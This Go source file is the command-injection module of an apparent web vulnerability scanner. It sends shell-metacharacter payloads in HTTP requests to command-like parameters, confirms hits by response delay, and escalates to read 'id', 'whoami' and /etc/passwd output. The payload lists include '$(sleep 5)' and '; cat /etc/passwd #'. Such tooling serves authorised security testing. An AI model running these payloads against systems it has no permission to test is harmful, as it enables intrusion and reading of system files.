// Package cmdi tests OS command injection: it injects time-based payloads into
// command-like parameters and confirms a hit when the response is delayed, then
// escalates with output-based payloads to read command output and prove RCE.
package cmdi

import (
	"io"
	"net/http"
	"net/http/httputil"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"time"

	"github.com/sayseven7/frameseven/internal/config"
	"github.com/sayseven7/frameseven/internal/finding"
	"github.com/sayseven7/frameseven/internal/tools/v1/recon"
)

// delayThreshold is the minimum extra delay over the baseline median that
// confirms a blind time-based injection. A real hit must also exceed three
// times the baseline and reproduce on a replay.
const delayThreshold = 4500 * time.Millisecond

var paramHint = regexp.MustCompile(`(?i)^(cmd|exec|command|run|ping|host|ip|query|search|input|file|path|name|id|user|pass|url|target)$`)

// timePayloads delay execution by ~5s when injected into a shell command.
var timePayloads = []string{
	"; sleep 5 #",
	"| sleep 5",
	"`sleep 5`",
	"$(sleep 5)",
	"& timeout 5",
}

// outputPayloads echo command output back into the response.
var outputPayloads = []string{
	"; id #",
	"| id",
	"`id`",
	"$(id)",
	"; whoami #",
	"; cat /etc/passwd #",
}

// windowsPayloads echo command output back on Windows hosts.
var windowsPayloads = []string{
	"& dir",
	"| dir",
	"; dir",
	"& ipconfig",
}

var (
	idSignature      = regexp.MustCompile(`uid=\d+\([^)]+\)`)
	passwdSignature  = regexp.MustCompile(`root:.*:0:0:`)
	windowsSignature = regexp.MustCompile(`(?i)Volume in drive|Directory of|Windows IP Configuration`)
)

type response struct {
	status  int
	body    string
	dump    string
	elapsed time.Duration
}

// Run injects command injection payloads into command-like parameters.
func Run(cfg *config.Config, client *http.Client, surface *recon.Surface) []finding.Finding {
	var findings []finding.Finding
	tested := map[string]bool{}

	for _, p := range surface.Params {
		if !paramHint.MatchString(p.Name) {
			continue
		}

		u, err := url.Parse(p.Endpoint)
		if err != nil {
			continue
		}

		key := p.Name + "|" + u.Path
		if tested[key] {
			continue
		}

		tested[key] = true

		if f, ok := testParam(cfg, client, p); ok {
			findings = append(findings, f)
		}
	}

	return findings
}

func testParam(cfg *config.Config, client *http.Client, p recon.Param) (finding.Finding, bool) {
	orig := origValue(p)

	baseline := request(cfg, client, p, orig)
	if baseline == nil {
		return finding.Finding{}, false
	}

	baselineMedian := medianLatency(sampleLatencies(cfg, client, p, orig, 3))
	threshold := baselineMedian + delayThreshold

	for _, payload := range timePayloads {
		first := request(cfg, client, p, orig+payload)
		if first == nil || first.elapsed < threshold || first.elapsed < 3*baselineMedian {
			continue
		}

		// Replay the payload: a single slow response is not enough, the delay
		// must reproduce before a blind time-based injection is confirmed.
		second := request(cfg, client, p, orig+payload)
		if second == nil || second.elapsed < threshold {
			continue
		}

		return buildFinding(cfg, client, p, orig, payload, first), true
	}

	return finding.Finding{}, false
}

func sampleLatencies(cfg *config.Config, client *http.Client, p recon.Param, value string, n int) []time.Duration {
	var out []time.Duration
	for i := 0; i < n; i++ {
		resp := request(cfg, client, p, value)
		if resp == nil {
			continue
		}

		out = append(out, resp.elapsed)
	}

	return out
}

func medianLatency(samples []time.Duration) time.Duration {
	if len(samples) == 0 {
		return 0
	}

	sorted := append([]time.Duration{}, samples...)
	sort.Slice(sorted, func(i, j int) bool { return sorted[i] < sorted[j] })

	return sorted[len(sorted)/2]
}

func buildFinding(cfg *config.Config, client *http.Client, p recon.Param, orig, timePayload string, detected *response) finding.Finding {
	extracted := "time-based payload: " + timePayload + "\ndelay: " + detected.elapsed.Round(time.Millisecond).String()

	// Blind time-based confirmation alone is strong but not maximal; capturing
	// real command output proves execution beyond doubt.
	confidence := 0.75

	output, used := extractOutput(cfg, client, p, orig)
	if output != "" {
		extracted += "\noutput payload: " + used + "\ncommand output:\n" + output
		confidence = 1.0
	}

	return finding.Finding{
		Title:       "OS command injection in parameter '" + p.Name + "'",
		Module:      "cmdi",
		Severity:    finding.Critical,
		OWASP:       "A03:2025 - Injection",
		CWE:         "CWE-78",
		CVSS:        9.8,
		Description: "A shell metacharacter payload delayed the response and, where shown, returned live command output, proving remote command execution on the host.",
		Evidence: finding.Evidence{
			Request:   detected.dump,
			Response:  trim(detected.body, 500),
			Extracted: extracted,
		},
		NextSteps: []string{
			"Treat the host as compromised and review for further access.",
			"Never pass user input to a shell; use parameterized APIs and strict allowlists.",
		},
		Confidence: confidence,
	}
}

// extractOutput escalates a confirmed injection to read real command output. It
// returns the captured output and the payload that produced it.
func extractOutput(cfg *config.Config, client *http.Client, p recon.Param, orig string) (string, string) {
	for _, payload := range outputPayloads {
		resp := request(cfg, client, p, orig+payload)
		if resp == nil {
			continue
		}

		if m := idSignature.FindString(resp.body); m != "" {
			return m, payload
		}

		if passwdSignature.MatchString(resp.body) {
			return trim(resp.body, 500), payload
		}
	}

	for _, payload := range windowsPayloads {
		resp := request(cfg, client, p, orig+payload)
		if resp == nil {
			continue
		}

		if windowsSignature.MatchString(resp.body) {
			return trim(resp.body, 500), payload
		}
	}

	return "", ""
}

func origValue(p recon.Param) string {
	u, err := url.Parse(p.Endpoint)
	if err != nil {
		return "1"
	}

	if v := u.Query().Get(p.Name); v != "" {
		return v
	}

	return "1"
}

func request(cfg *config.Config, client *http.Client, p recon.Param, value string) *response {
	u, err := url.Parse(p.Endpoint)
	if err != nil {
		return nil
	}

	q := u.Query()
	q.Set(p.Name, value)
	u.RawQuery = q.Encode()

	req, err := http.NewRequest(http.MethodGet, u.String(), nil)
	if err != nil {
		return nil
	}

	req.Header.Set("User-Agent", cfg.UserAgent)

	dump, _ := httputil.DumpRequestOut(req, false)

	started := time.Now()

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	elapsed := time.Since(started)

	return &response{status: resp.StatusCode, body: string(body), dump: string(dump), elapsed: elapsed}
}

func trim(s string, max int) string {
	s = strings.TrimSpace(s)
	if len(s) > max {
		return s[:max]
	}

	return s
}
